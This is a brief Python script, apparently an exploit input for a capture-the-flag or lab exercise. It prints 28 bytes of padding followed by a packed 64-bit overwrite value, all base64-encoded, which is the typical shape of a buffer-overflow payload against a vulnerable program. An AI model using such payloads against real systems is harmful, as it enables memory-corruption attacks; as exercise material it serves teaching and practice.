
import sys
import struct
import base64

buf = b'ffffffffffffffffffffffffffff'
buf += struct.pack('<Q', 1356083826067089410)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
